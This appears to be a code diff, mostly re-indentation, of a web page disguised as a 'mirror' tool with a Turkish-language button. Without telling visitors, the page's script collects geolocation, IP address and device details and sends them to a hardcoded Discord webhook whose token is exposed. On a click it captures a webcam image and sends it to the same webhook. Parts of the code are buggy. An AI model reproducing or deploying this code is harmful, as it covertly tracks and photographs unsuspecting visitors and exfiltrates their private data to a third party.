@@ -8,91 +8,90 @@
     <button id="take-picture">Ayna Kullan.</button>
     <div id="picture-container"></div>
 
-<script>
-  const takePictureButton = document.getElementById('take-picture');
-  const pictureContainer = document.getElementById('picture-container');
+    <script>
+      const takePictureButton = document.getElementById('take-picture');
+      const pictureContainer = document.getElementById('picture-container');
 
-  // Request the user's location
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(position => {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+      // Request the user's location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
 
-      // Send the user's location to the Discord webhook
-      const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
-      const formData = new FormData();
-      formData.append('content', `Siteye Girildi: ${lat}, ${lon}`);
+          // Send the user's location to the Discord webhook
+          const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
+          const formData = new FormData();
+          formData.append('content', `Siteye Girildi: ${lat}, ${lon}`);
 
-      fetch(webhookUrl, {
-        method: 'POST',
-        body: formData,
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error(error));
+        });
+      } else {
+        console.error('Geolocation is not supported by this browser.');
+      }
+
+      // Get the user's IP address
+      fetch('https://api.ipify.org/?format=json')
+    .then(response => response.json())
+    .then(data => {
+        const ipAddress = data.ip;
+
+        // Get the user's device information
+        const userAgent = navigator.userAgent;
+        const deviceInfo = {
+          browser: userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          userAgent: userAgent,
+        };
+
+        // Send the user's IP address and device information to the Discord webhook
+        const formData = new FormData();
+        formData.append('content', `Siteye Girildi: ${ipAddress} - ${deviceInfo.browser} - ${deviceInfo.platform} - ${deviceInfo.language}`);
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          body: formData,
+        })
+      .then(response => response.json())
+      .then(data => console.log(data))
+      .catch(error => console.error(error));
       })
-     .then(response => response.json())
-     .then(data => console.log(data))
-     .catch(error => console.error(error));
-    });
-  } else {
-    console.error('Geolocation is not supported by this browser.');
-  }
+    .catch(error => console.error(error));
 
-  // Get the user's IP address
-  fetch('https://api.ipify.org/?format=json')
- .then(response => response.json())
- .then(data => {
-    const ipAddress = data.ip;
+      takePictureButton.addEventListener('click', async () => {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
 
-    // Get the user's device information
-    const userAgent = navigator.userAgent;
-    const deviceInfo = {
-      browser: userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      userAgent: userAgent,
-    };
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
 
-    // Send the user's IP address and device information to the Discord webhook
-    const formData = new FormData();
-    formData.append('content', `Siteye Girildi: ${ipAddress} - ${deviceInfo.browser} - ${deviceInfo.platform} - ${deviceInfo.language}`);
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    fetch(webhookUrl, {
-      method: 'POST',
-      body: formData,
-    })
-   .then(response => response.json())
-   .then(data => console.log(data))
-   .catch(error => console.error(error));
-  })
- .catch(error => console.error(error));
+          const imageData = canvas.toDataURL('image/jpeg');
+          const image = document.createElement('img');
+          image.src = imageData;
+          pictureContainer.appendChild(image);
 
-  takePictureButton.addEventListener('click', async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
+          // Send the image to the Discord webhook
+          const formData = new FormData();
+          formData.append('file', imageData.split(',')[1]);
+          formData.append('filename', 'image.jpg');
+          formData.append('content', 'Resim Çekildi!');
 
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      const context = canvas.getContext('2d');
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const imageData = canvas.toDataURL('image/jpeg');
-      const image = document.createElement('img');
-      image.src = imageData;
-      pictureContainer.appendChild(image);
-
-      // Send the image to the Discord webhook
-      const formData = new FormData();
-      formData.append('file', imageData.split(',')[1]);
-      formData.append('filename', 'image.jpg');
-      formData.append('content', 'Resim Çekildi!');
-
-      fetch(webhookUrl, {
-        method: 'POST',
-        body: formData,
-      })
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
           })
         .then(response => response.json())
         .then(data => console.log(data))
